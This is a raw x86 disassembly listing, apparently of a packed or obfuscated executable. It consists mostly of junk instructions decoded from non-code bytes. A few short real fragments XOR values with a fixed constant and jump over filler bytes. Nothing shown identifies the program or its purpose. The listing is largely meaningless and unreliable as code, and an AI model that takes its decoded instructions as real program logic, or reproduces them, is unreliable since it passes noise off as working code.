  40bd5f:	ins    DWORD PTR es:[edi],dx
  40bd60:	mov    eax,edi
  40bd62:	push   ebp
  40bd63:	or     ch,al
  40bd65:	add    edx,DWORD PTR [eax]
  40bd67:	ret    
  40bd68:	fsubr  st(6),st
  40bd6a:	sub    al,0x41
  40bd6c:	lods   eax,DWORD PTR ds:[esi]
  40bd6d:	popf   
  40bd6e:	xchg   BYTE PTR [edi+0x71d9f98a],bl
  40bd74:	xor    al,0x8f
  40bd76:	jbe    0x40bd72
  40bd78:	cmp    bh,BYTE PTR [eax-0x7cb20cae]
  40bd7e:	int3   
  40bd7f:	pop    esi
  40bd80:	inc    eax
  40bd81:	aad    0x42
  40bd83:	inc    edx
  40bd84:	aaa    
  40bd85:	std    
  40bd86:	adc    ebp,DWORD PTR [ecx+0x6a02fa0d]
  40bd8c:	jmp    0x40bd6c
  40bd8e:	jne    0x40bd32
  40bd90:	adc    DWORD PTR [ebx-0x2d],ebp
  40bd93:	jecxz  0x40bd43
  40bd95:	xor    DWORD PTR [esi-0x59],0xcfed8d2f
  40bd9c:	adc    DWORD PTR [ecx],esi
  40bd9e:	xor    BYTE PTR [eax],cl
  40bda0:	ja     0x40bd42
  40bda2:	out    dx,eax
  40bda3:	pop    ebx
  40bda4:	xor    al,0x52
  40bda6:	pop    es
  40bda7:	adc    al,0x4c
  40bda9:	(bad)  
  40bdaa:	retf   
  40bdab:	and    eax,0x79f870cc
  40bdb0:	aad    0x97
  40bdb2:	popa   
  40bdb3:	mov    al,0x9e
  40bdb5:	xlat   BYTE PTR ds:[ebx]
  40bdb6:	dec    ebx
  40bdb7:	lgs    eax,FWORD PTR [edi+0x6c]
  40bdbb:	jmp    0x40bdb9
  40bdbd:	test   BYTE PTR [edi],al
  40bdbf:	mov    esp,0x978144bd
  40bdc4:	xchg   edx,eax
  40bdc5:	inc    di
  40bdc7:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdc9:	mov    al,ds:0x201bc380
  40bdce:	pop    es
  40bdcf:	add    al,BYTE PTR ss:[edx+0x6091482a]
  40bdd6:	add    BYTE PTR [edx-0x366624b],dh
  40bddc:	adc    esi,DWORD PTR ds:0xecd4e84f
  40bde2:	dec    edi
  40bde3:	jge    0x40be1c
  40bde5:	sti    
  40bde6:	stc    
  40bde7:	int3   
  40bde8:	xchg   ecx,eax
  40bde9:	adc    al,0xfa
  40bdeb:	xor    DWORD PTR [esi-0x39f3b7e3],edx
  40bdf1:	sbb    ebx,eax
  40bdf3:	into   
  40bdf4:	pop    ss
  40bdf5:	leave  
  40bdf6:	add    al,0x1e
  40bdf8:	push   ecx
  40bdf9:	pop    esi
  40bdfa:	sar    BYTE PTR [ebx+eax*1],0x78
  40bdfe:	push   ebp
  40bdff:	or     ecx,DWORD PTR [eax+0x3d]
  40be02:	sub    cl,BYTE PTR [edi]
  40be04:	pusha  
  40be05:	pusha  
  40be06:	sub    ebx,DWORD PTR [edi-0x6e]
  40be09:	and    ch,BYTE PTR [ebx-0xe]
  40be0c:	jne    0x40bdec
  40be0e:	into   
  40be0f:	fucomi st,st(5)
  40be11:	push   ebx
  40be12:	mov    dh,0x1e
  40be14:	sti    
  40be15:	fsub   DWORD PTR ds:0x26b82704
  40be1b:	or     DWORD PTR [esi],edx
  40be1d:	push   esi
  40be1e:	popf   
  40be1f:	lds    eax,FWORD PTR [esi+ebx*1+0x2c]
  40be23:	adc    eax,0x77560c86
  40be28:	sbb    eax,0xf4d6ad5
  40be2d:	xchg   esi,eax
  40be2e:	ss pushf 
  40be30:	shr    BYTE PTR gs:[ecx],0xbd
  40be34:	retf   0x2468
  40be37:	push   0xffffffa8
  40be39:	ds sub bl,ch
  40be3c:	fldenv [eax+0x2a964911]
  40be42:	push   eax
  40be43:	iret   
  40be44:	jb     0x40be3b
  40be46:	xor    BYTE PTR [edi-0x770049b4],dl
  40be4c:	fsubp  st(7),st
  40be4e:	mov    BYTE PTR [ebp+0x9],dl
  40be51:	fwait
  40be52:	(bad)  
  40be53:	gs jbe 0x40be96
  40be56:	gs xchg edi,eax
  40be58:	jmp    0x40bed2
  40be5a:	movnti DWORD PTR [ebp+0x76],esp
  40be5e:	adc    ah,0x4a
  40be61:	test   al,0x7d
  40be63:	inc    ecx
  40be64:	addr16 jl 0x40be75
  40be67:	jnp    0x40be1f
  40be69:	cmp    BYTE PTR [eax],0x54
  40be6c:	into   
  40be6d:	(bad)
  40be70:	les    esi,FWORD PTR [ebp-0x19fd687f]
  40be76:	cmp    eax,0x9a66fe3d
  40be7b:	ret    
  40be7c:	sbb    bl,bh
  40be7e:	pop    ss
  40be7f:	outs   dx,DWORD PTR ds:[esi]
  40be80:	sub    eax,0x81a74113
  40be85:	dec    edi
  40be86:	xchg   ebp,eax
  40be87:	popf   
  40be88:	(bad)  
  40be89:	mov    ecx,DWORD PTR [edx+ebp*4-0x75]
  40be8d:	jmp    0xc9c4:0xf6f4c0d7
  40be94:	jl     0x40be26
  40be96:	or     ch,dl
  40be98:	rcr    DWORD PTR [ebp-0x7a971754],cl
  40be9e:	push   ebp
  40be9f:	adc    cl,BYTE PTR [esi-0x64]
  40bea2:	(bad)  
  40bea3:	fmul   QWORD PTR [edx+edx*1]
  40bea6:	(bad)  
  40bea7:	mov    ecx,0x721420c4
  40beac:	or     DWORD PTR [esi+edi*8-0x6b],eax
  40beb0:	scas   eax,DWORD PTR es:[edi]
  40beb1:	adc    al,0x50
  40beb3:	stos   BYTE PTR es:[edi],al
  40beb4:	mov    ebp,0x873e72a
  40beb9:	xor    al,0x88
  40bebb:	inc    ebx
  40bebc:	loopne 0x40bed4
  40bebe:	add    DWORD PTR [ebx],esi
  40bec0:	imul   ecx,DWORD PTR [esi-0x308ee4f9],0xffffffa5
  40bec7:	retf   
  40bec8:	adc    ebp,DWORD PTR [esi+0x70]
  40becb:	retf   0xed47
  40bece:	mov    eax,0x116aa12f
  40bed3:	adc    BYTE PTR [ebp-0x4003b79c],cl
  40bed9:	pop    ecx
  40beda:	mov    eax,ds:0xdefdc268
  40bedf:	pop    edi
  40bee0:	rol    DWORD PTR [edi],1
  40bee2:	xchg   ebx,eax
  40bee3:	js     0x40bf3e
  40bee5:	(bad)  
  40bee6:	push   ebp
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x7684ed31]
  40bf27:	pushf  
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40beec
  40bf31:	mov    sp,0x8680
  40bf35:	in     eax,dx
  40bf36:	repnz pop ebp
  40bf38:	ss in  eax,0xc3
  40bf3b:	pop    ecx
  40bf3c:	xor    DWORD PTR [edi],ecx
  40bf3e:	inc    ebp
  40bf3f:	add    BYTE PTR [esi],cl
  40bf41:	xor    DWORD PTR [ecx],ebp
  40bf43:	ficom  WORD PTR [ecx]
  40bf45:	and    al,dh
  40bf47:	inc    eax
  40bf48:	jecxz  0x40bfad
  40bf4a:	jmp    0x1a27:0xbff5ba77
  40bf51:	cwde   
  40bf52:	and    BYTE PTR [ebx+ebp*2+0x62f4050b],0x22
  40bf5a:	dec    edx
  40bf5b:	(bad)  
  40bf5d:	xor    BYTE PTR [eax+0x7a],bl
  40bf60:	jmp    0x40bf97
  40bf62:	adc    al,BYTE PTR [edx+0x56]
  40bf65:	inc    eax
  40bf66:	mov    edx,0xc5ae7695
  40bf6b:	add    dl,dl
  40bf6d:	sbb    eax,0x2e2026ae
  40bf72:	jl     0x40bfa9
  40bf74:	fstp   TBYTE PTR [edi+0x5651cd8f]
  40bf7a:	nop
  40bf7b:	(bad)  [esi]
  40bf7d:	das    
  40bf7e:	rol    BYTE PTR ds:0xd63d751a,cl
  40bf84:	test   edx,edi
  40bf86:	push   es
  40bf87:	int3   
  40bf88:	sbb    BYTE PTR [edi+0x2],0x15
  40bf8c:	cmp    DWORD PTR [edi-0x16d6b6d1],esp
  40bf92:	rol    eax,cl
  40bf94:	or     cl,BYTE PTR [ebp+0x5e]
  40bf97:	ret    
  40bf98:	jl     0x40bf52
  40bf9a:	loopne 0x40bf59
  40bf9c:	sub    BYTE PTR [eax+0x47],0x45
  40bfa0:	arpl   WORD PTR [edi],si
  40bfa2:	test   al,0x6c
  40bfa4:	mov    eax,0x517e681c
  40bfa9:	mov    dh,cl
  40bfab:	daa    
  40bfac:	loop   0x40bf79
  40bfae:	inc    edi
  40bfaf:	jns    0x40bf96
  40bfb1:	ror    BYTE PTR [ebx-0x2328391e],1
  40bfb7:	pop    esp
  40bfb8:	inc    edx
  40bfb9:	lahf   
  40bfba:	inc    esp
  40bfbb:	jecxz  0x40bfda
  40bfbd:	pop    ss
  40bfbe:	add    ebp,DWORD PTR [ebx-0xd]
  40bfc1:	std    
  40bfc2:	inc    esi
  40bfc3:	cmp    esp,DWORD PTR ds:0xfd9f8241
  40bfc9:	iret   
  40bfca:	pusha  
  40bfcb:	and    esi,0xac6af836
  40bfd1:	or     DWORD PTR [edx+0x7039240a],ecx
  40bfd7:	or     al,0xa7
  40bfd9:	inc    ebp
  40bfda:	add    ch,BYTE PTR [edx-0x4907a5e4]
  40bfe0:	jecxz  0x40bfad
  40bfe2:	xchg   esp,eax
  40bfe3:	sahf   
  40bfe4:	mov    WORD PTR [ecx],cs
  40bfe6:	idiv   BYTE PTR ss:[esi]
  40bfe9:	aas    
  40bfea:	fs repz repnz mov ch,0x9c
  40bfef:	jg     0x40bfa1
  40bff1:	pop    esp
  40bff2:	test   DWORD PTR [edi-0x5a],edx
  40bff5:	and    edx,DWORD PTR [edx-0x50]
  40bff8:	sbb    al,0xc3
  40bffa:	outs   dx,BYTE PTR ds:[esi]
  40bffb:	call   FWORD PTR [eax]
  40bffd:	mov    WORD PTR ds:0xbfec954c,cs
  40c003:	and    bl,BYTE PTR [eax+0x666493da]
  40c009:	or     DWORD PTR [edi],edx
  40c00b:	inc    esi
  40c00c:	pushf  
  40c00d:	leave  
  40c00e:	addr16 adc esi,ecx
  40c011:	cmp    bh,BYTE PTR ds:0xf3ba262a
  40c017:	(bad)  
  40c018:	sbb    al,0x3b
  40c01a:	dec    ecx
  40c01b:	xor    eax,DWORD PTR [ebx+0x63]
  40c01e:	test   BYTE PTR [esi-0x7db6c248],ch
  40c024:	jle    0x40c034
  40c026:	or     edi,DWORD PTR [edx]
  40c028:	ret    
  40c029:	xchg   esi,eax
  40c02a:	mov    al,0x50
  40c02c:	fidivr WORD PTR [eax-0x67f75af6]
  40c032:	out    dx,al
  40c033:	push   ebx
  40c034:	add    bl,cl
  40c036:	int3   
  40c037:	mov    ecx,0xfc13096e
  40c03c:	pop    edi
  40c03d:	mov    bl,0x89
  40c03f:	fmul   st(7),st
  40c041:	icebp  
  40c042:	push   ebp
  40c043:	rcl    DWORD PTR [esi+0x7edc7354],cl
  40c049:	add    esp,DWORD PTR [edx+ebp*1]
  40c04c:	jl     0x40c05e
  40c04e:	or     dl,ah
  40c050:	jmp    0x2e6b:0x94836456
  40c057:	addr16 push ebx
  40c059:	mov    eax,0x1bc3250a
  40c05e:	dec    edi
  40c05f:	cli    
  40c060:	test   DWORD PTR [eax-0x77],edx
  40c063:	popf   
  40c064:	clc    
  40c065:	jmp    0x40c05a
  40c067:	mov    bh,0x80
  40c069:	arpl   WORD PTR [ebx],sp
  40c06b:	ins    DWORD PTR es:[edi],dx
  40c06c:	shr    BYTE PTR [eax],0x4e
  40c06f:	cmp    al,0xcb
  40c071:	xor    ecx,DWORD PTR [ebp-0x2a5d062f]
  40c077:	ins    BYTE PTR es:[edi],dx
  40c078:	inc    eax
  40c079:	mov    al,ds:0xc286e57c
  40c07e:	jl     0x40c011
  40c080:	in     eax,0xc5
  40c082:	les    edi,FWORD PTR [esi+edi*8]
  40c085:	out    dx,eax
  40c086:	dec    esi
  40c087:	mov    ch,0xc1
  40c089:	jl     0x40c096
  40c08b:	sahf   
  40c08c:	ss sub al,0x4d
  40c08f:	xchg   BYTE PTR [edx],bl
  40c091:	leave  
  40c092:	shl    BYTE PTR [esi-0x1c],cl
  40c095:	ret    0x6eb3
  40c098:	mov    ch,0x6b
  40c09a:	lahf   
  40c09b:	inc    edx
  40c09c:	dec    ebx
  40c09d:	repnz add dh,BYTE PTR [ecx+0xcc9c65f]
  40c0a4:	retf   
  40c0a5:	mov    ecx,DWORD PTR [ebp+edi*2-0x4f]
  40c0a9:	out    dx,eax
  40c0aa:	ja     0x40c0e9
  40c0ac:	adc    al,0x57
  40c0ae:	rol    dh,0x9f
  40c0b1:	or     BYTE PTR [edi+0x1f276513],bl
  40c0b7:	cwde   
  40c0b8:	jmp    0xb7326fcb
  40c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0be:	(bad)  
  40c0bf:	xchg   ebp,eax
  40c0c0:	mov    ?,WORD PTR [eax-0x245b4fd9]
  40c0c6:	push   es
  40c0c7:	xchg   edi,eax
  40c0c8:	push   cs
  40c0c9:	gs sub eax,0x1b767d67
  40c0cf:	(bad)  
  40c0d0:	cmp    eax,0x4531aa7f
  40c0d5:	pop    ebx
  40c0d6:	lods   eax,DWORD PTR ds:[esi]
  40c0d7:	sub    eax,DWORD PTR [ebp-0xdc268de]
  40c0dd:	shl    DWORD PTR [esi],cl
  40c0df:	dec    eax
  40c0e0:	jmp    0x40c09d
  40c0e2:	mov    dl,BYTE PTR [ecx+0x64]
  40c0e5:	mov    ?,WORD PTR [ecx+0x36]
  40c0e8:	(bad)  
  40c0e9:	sbb    bl,BYTE PTR [edi]
  40c0eb:	pop    eax
  40c0ec:	ror    BYTE PTR [ecx+0x45],cl
  40c0ef:	ficomp DWORD PTR [edi+0x15a4bd97]
  40c0f5:	in     eax,0x59
  40c0f7:	int3   
  40c0f8:	ret    0x3534
  40c0fb:	mov    ebp,0xe9adcac3
  40c100:	mov    bh,0x8a
  40c102:	xchg   DWORD PTR [edx-0x3bc5bf4],edx
  40c108:	cdq    
  40c109:	leave  
  40c10a:	push   esi
  40c10b:	inc    ecx
  40c10c:	aaa    
  40c10d:	iret   
  40c10e:	mov    cl,0x7a
  40c110:	pop    ebp
  40c111:	pusha  
  40c112:	or     DWORD PTR [bp+di-0x4a],esp
  40c116:	lods   al,BYTE PTR ds:[esi]
  40c117:	out    dx,eax
  40c118:	test   ebx,edi
  40c11a:	pop    eax
  40c11b:	xchg   ecx,eax
  40c11c:	xchg   edx,eax
  40c11d:	shl    BYTE PTR [edi-0x11eb71fc],cl
  40c123:	pusha  
  40c124:	jne    0x40c102
  40c126:	jnp    0x40c0b7
  40c128:	in     eax,dx
  40c129:	dec    esi
  40c12a:	inc    esi
  40c12b:	stc    
  40c12c:	ins    DWORD PTR es:[edi],dx
  40c12d:	adc    bh,ah
  40c12f:	adc    al,0xc4
  40c131:	sbb    al,0x23
  40c133:	dec    esi
  40c134:	je     0x40c126
  40c136:	fmul   QWORD PTR ds:0xdb9599f9
  40c13c:	outs   dx,BYTE PTR ds:[esi]
  40c13d:	ret    0x9914
  40c140:	and    ebx,edx
  40c142:	push   edi
  40c143:	and    al,0x37
  40c145:	pop    edi
  40c146:	imul   ebx,DWORD PTR [esi-0x70],0xffffffc0
  40c14a:	add    edi,DWORD PTR [eax+0x17f8d17d]
  40c150:	dec    eax
  40c151:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c153:	mov    edi,0x3cf083a0
  40c158:	test   ebp,0xc199ec74
  40c15e:	pop    ss
  40c15f:	mov    ss,WORD PTR [ecx-0x694746f]
  40c165:	das    
  40c166:	or     eax,0x85625bcc
  40c16b:	dec    eax
  40c16c:	in     eax,dx
  40c16d:	and    bh,ch
  40c16f:	stc    
  40c170:	dec    esi
  40c171:	int    0x8e
  40c173:	push   eax
  40c174:	lahf   
  40c175:	xor    al,0x87
  40c177:	retf   
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x73
  40c196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c197:	test   al,0x8c
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	popa   
  40c1a2:	sub    ebx,ebx
  40c1a4:	pop    edx
  40c1a5:	or     eax,0xf209ef86
  40c1aa:	out    0x2,eax
  40c1ac:	jle    0x40c1a3
  40c1ae:	pop    edi
  40c1af:	bound  ecx,QWORD PTR [esi+ecx*2]
  40c1b2:	xor    eax,0xfa1d8a1
  40c1b7:	xchg   ebx,eax
  40c1b8:	mov    cl,0xb9
  40c1ba:	cmp    eax,0x6348573c
  40c1bf:	pop    eax
  40c1c0:	push   edx
  40c1c2:	and    BYTE PTR [edi+0x244ebf2c],ah
  40c1c8:	ins    DWORD PTR es:[edi],dx
  40c1c9:	lods   al,BYTE PTR ds:[esi]
  40c1ca:	outs   dx,DWORD PTR ds:[esi]
  40c1cb:	push   esi
  40c1cc:	xor    ch,cl
  40c1ce:	inc    eax
  40c1cf:	rdpmc  
  40c1d1:	mov    edi,0x3d7aa7b
  40c1d6:	ds inc ebx
  40c1d8:	push   0xffffffed
  40c1da:	ror    BYTE PTR [ebx-0x72e6af96],0x7
  40c1e1:	adc    DWORD PTR [esi],ebp
  40c1e3:	jo     0x40c1db
  40c1e5:	add    al,BYTE PTR [edx+0x23]
  40c1e8:	in     al,0xf9
  40c1ea:	inc    ebp
  40c1eb:	jmp    0x40c213
  40c1ed:	add    ah,BYTE PTR [ebx-0x79]
  40c1f0:	stos   DWORD PTR es:[edi],eax
  40c1f1:	jbe    0x40c19c
  40c1f3:	ins    DWORD PTR es:[edi],dx
  40c1f4:	pop    esp
  40c1f5:	inc    esi
  40c1f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f7:	es inc ecx
  40c1f9:	pop    ecx
  40c1fa:	mov    BYTE PTR [edx-0x3a528ec9],cl
  40c200:	xchg   BYTE PTR ds:0x60733222,al
  40c206:	or     BYTE PTR [edi+ecx*1],ah
  40c209:	enter  0x4c4b,0x88
  40c20d:	push   es
  40c20e:	sub    WORD PTR ds:0xa66cae2a,bp
  40c215:	or     ch,BYTE PTR [ecx]
  40c217:	inc    edi
  40c218:	dec    ebx
  40c219:	push   0x55
  40c21b:	inc    BYTE PTR [ecx+0x37ec01b4]
  40c221:	and    eax,0x7eca5922
  40c226:	push   ebp
  40c227:	xchg   edx,eax
  40c228:	xor    al,0x72
  40c22a:	mov    esi,0x70dd887
  40c22f:	sar    DWORD PTR [edi-0x7bfb92bb],1
  40c235:	jg     0x40c2b6
  40c237:	es cmp eax,0xc59c184c
  40c23d:	mov    ebp,0x5b24ffd0
  40c242:	jb     0x40c251
  40c244:	or     BYTE PTR [ebx+0x5d8baef8],0x61
  40c24b:	mov    ecx,0x6322b393
  40c250:	fwait
  40c251:	sub    eax,0x1042e17c
  40c256:	jecxz  0x40c247
  40c258:	adc    eax,0xfa4d8d3
  40c25d:	inc    ebx
  40c25e:	inc    ebp
  40c25f:	mov    esi,0xf0d6335a
  40c264:	test   al,0xf6
  40c266:	add    eax,0xd41ee942
  40c26b:	bound  edx,QWORD PTR [edx+0x7cba5c68]
  40c271:	adc    eax,0x885b70fd
  40c276:	je     0x40c21a
  40c278:	call   0xed4d:0xf9f9d3f4
  40c27f:	out    dx,eax
  40c280:	mov    dh,0xa1
  40c282:	sub    ch,BYTE PTR [ecx-0x7e47f651]
  40c288:	and    ebp,DWORD PTR [ebp-0x6675669e]
  40c28e:	ret    0xa372
  40c291:	pop    es
  40c292:	jg     0x40c259
  40c294:	pop    ds
  40c295:	mov    ah,0xad
  40c297:	push   ss
  40c298:	inc    esp
  40c299:	sbb    ch,0x7c
  40c29c:	mov    bl,0xb2
  40c29e:	or     al,0xb8
  40c2a0:	iret   
  40c2a1:	js     0x40c238
  40c2a3:	clc    
  40c2a4:	fild   DWORD PTR [ebx-0x52]
  40c2a7:	pop    es
  40c2a8:	jl     0x40c2aa
  40c2aa:	sbb    DWORD PTR [ebx],edx
  40c2ac:	mov    ebp,0xdb85c260
  40c2b1:	push   ecx
  40c2b2:	xchg   esi,eax
  40c2b3:	div    BYTE PTR [eax+0x721f2532]
  40c2b9:	mov    ebp,0x8197518b
  40c2be:	outs   dx,DWORD PTR ds:[esi]
  40c2bf:	das    
  40c2c0:	neg    DWORD PTR [ecx]
  40c2c2:	jno    0x40c284
  40c2c4:	inc    ebp
  40c2c5:	mov    edx,0xf87e6180
  40c2ca:	arpl   WORD PTR [edi+0x58cb8516],si
  40c2d0:	sahf   
  40c2d1:	es scas eax,DWORD PTR es:[edi]
  40c2d3:	push   0x66
  40c2d5:	out    dx,eax
  40c2d6:	or     bh,BYTE PTR ss:[edx-0x40]
  40c2da:	cli    
  40c2db:	fisubr DWORD PTR [ebp-0x1897fcd4]
  40c2e1:	xlat   BYTE PTR ds:[ebx]
  40c2e2:	fld    QWORD PTR [eax-0x12]
  40c2e5:	jns    0x40c2dc
  40c2e7:	scas   al,BYTE PTR es:[edi]
  40c2e8:	xchg   esp,eax
  40c2e9:	and    al,0xf2
  40c2eb:	jo     0x40c2a1
  40c2ed:	out    0xf,al
  40c2ef:	xchg   edi,eax
  40c2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f1:	(bad)  
  40c2f2:	cmp    DWORD PTR [eax],ebp
  40c2f4:	xchg   esp,eax
  40c2f5:	retf   
  40c2f6:	jo     0x40c2e6
  40c2f8:	and    eax,0xca9a4e8b
  40c2fd:	xor    bh,cl
  40c2ff:	dec    ebp
  40c300:	(bad)  
  40c301:	xadd   DWORD PTR [eax],ecx
  40c304:	adc    ah,BYTE PTR [ecx-0x3a]
  40c307:	clc    
  40c308:	scas   al,BYTE PTR es:[edi]
  40c309:	push   ebp
  40c30a:	push   es
  40c30b:	push   esp
  40c30c:	cmc    
  40c30d:	dec    edx
  40c30e:	xlat   BYTE PTR ds:[ebx]
  40c30f:	xor    BYTE PTR [edx+esi*4-0x68d66fa2],ah
  40c316:	addr16 or bh,cl
  40c319:	test   ecx,esi
  40c31b:	xchg   ecx,eax
  40c31c:	cld    
  40c31d:	loope  0x40c2aa
  40c31f:	pop    esi
  40c320:	push   ebp
  40c321:	(bad)  
  40c322:	(bad)  
  40c323:	in     al,dx
  40c324:	test   al,0xf1
  40c326:	xor    BYTE PTR [esi],0x6d
  40c329:	mov    ch,0x35
  40c32b:	cmp    eax,0xc0c8c2c2
  40c330:	(bad)  
  40c331:	retf   
  40c332:	leave  
  40c333:	mov    edi,ebx
  40c335:	mov    al,0xb1
  40c337:	or     BYTE PTR [esi+eiz*4],ch
  40c33a:	imul   edx,DWORD PTR [ecx],0xffffffb4
  40c33d:	out    dx,eax
  40c33e:	(bad)  
  40c33f:	sbb    cl,cl
  40c341:	test   DWORD PTR [eax+0x63],ebx
  40c344:	and    al,0x28
  40c346:	sbb    eax,0xc2f55de1
  40c34b:	inc    esi
  40c34c:	repz fwait
  40c34e:	adc    al,0x82
  40c350:	daa    
  40c351:	pop    ebp
  40c352:	in     eax,dx
  40c353:	mov    bl,0xc6
  40c355:	mov    edx,0x88b5a0bf
  40c35a:	pop    eax
  40c35b:	jne    0x40c3c1
  40c35d:	xchg   BYTE PTR [ecx-0x4b],bl
  40c360:	xor    BYTE PTR [ecx],ch
  40c362:	ret    0xba83
  40c365:	jno    0x40c339
  40c367:	mov    al,0xcb
  40c369:	test   DWORD PTR [ecx],ebx
  40c36b:	das    
  40c36c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c36d:	enter  0x931b,0x3e
  40c371:	aaa    
  40c372:	jns    0x40c36e
  40c374:	dec    edx
  40c375:	mov    ds:0xe9731a9e,eax
  40c37a:	mov    dl,0x89
  40c37c:	mov    ecx,0xaad36e5f
  40c381:	gs dec edx
  40c383:	mov    cl,0x7e
  40c385:	jae    0x40c3e1
  40c387:	xchg   ecx,eax
  40c388:	push   cs
  40c389:	test   DWORD PTR ds:0xdc76e051,ebx
  40c38f:	dec    esi
  40c390:	es mov ebx,0x2ede10d
  40c396:	div    DWORD PTR [esi-0x67]
  40c399:	aaa    
  40c39a:	dec    ebp
  40c39b:	jno    0x40c34d
  40c39d:	rol    DWORD PTR [edx+0x3f],1
  40c3a0:	or     bh,BYTE PTR [eax]
  40c3a2:	sbb    al,0x3c
  40c3a4:	cmp    DWORD PTR [esi+ebx*8+0xf88c7f8],esp
  40c3ab:	test   al,0x84
  40c3ad:	int    0x30
  40c3af:	pop    ss
  40c3b0:	mov    edi,0x529a4efc
  40c3b5:	adc    eax,0xb3de365c
  40c3ba:	lods   eax,DWORD PTR ds:[esi]
  40c3bb:	pop    edx
  40c3bc:	in     eax,dx
  40c3bd:	ins    DWORD PTR es:[edi],dx
  40c3be:	int    0x7c
  40c3c0:	cmp    al,0x46
  40c3c2:	pushf  
  40c3c3:	popf   
  40c3c4:	push   es
  40c3c5:	dec    esi
  40c3c6:	or     eax,0x108c8a71
  40c3cb:	jg     0x40c3f5
  40c3cd:	and    al,al
  40c3cf:	nop
  40c3d0:	push   0xffffff99
  40c3d2:	jbe    0x40c3c8
  40c3d4:	lods   al,BYTE PTR ds:[esi]
  40c3d5:	fstp   QWORD PTR [esi-0x4c35e919]
  40c3db:	jge    0x40c3cd
  40c3dd:	push   eax
  40c3de:	cmp    eax,0x1ff286c2
  40c3e3:	push   ebx
  40c3e4:	js     0x40c3da
  40c3e6:	xchg   BYTE PTR [ebx+0x54b9fc45],cl
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [eax],cl
  40c447:	mov    al,0x6a
  40c449:	or     edx,DWORD PTR [edx+eax*4]
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	pop    ss
  40c453:	add    ah,0x80
  40c456:	lock cwde 
  40c458:	sub    esp,eax
  40c45a:	(bad)  
  40c45c:	mov    al,0x61
  40c45e:	pop    ds
  40c45f:	push   ecx
  40c460:	ret    0xbb91
  40c463:	fld    TBYTE PTR [ecx]
  40c465:	fs jae 0x40c3e8
  40c468:	xor    BYTE PTR [edx+edi*1],bl
  40c46b:	mov    ah,0x43
  40c46d:	and    ebx,DWORD PTR [edx+0x4c426f38]
  40c473:	in     al,0x65
  40c475:	(bad)  
  40c476:	in     al,0xe3
  40c478:	add    edi,edi
  40c47a:	ins    DWORD PTR es:[edi],dx
  40c47b:	fnclex 
  40c47d:	jmp    FWORD PTR [edx]
  40c47f:	cmp    edx,DWORD PTR [edi]
  40c481:	mov    cl,0x1
  40c483:	test   eax,0xc0f720ee
  40c488:	int3   
  40c489:	loop   0x40c47a
  40c48b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c48c:	nop
  40c48d:	mov    edi,0xbc7a8aa5
  40c492:	ins    DWORD PTR es:[edi],dx
  40c493:	nop
  40c494:	xchg   edx,eax
  40c495:	xor    DWORD PTR [ecx+0x39],ebx
  40c498:	mov    ds:0x5d36af1c,al
  40c49d:	mov    ecx,0xd7cbf092
  40c4a2:	ja     0x40c500
  40c4a4:	sar    DWORD PTR [edi-0x3f5bec5a],0xec
  40c4ab:	popf   
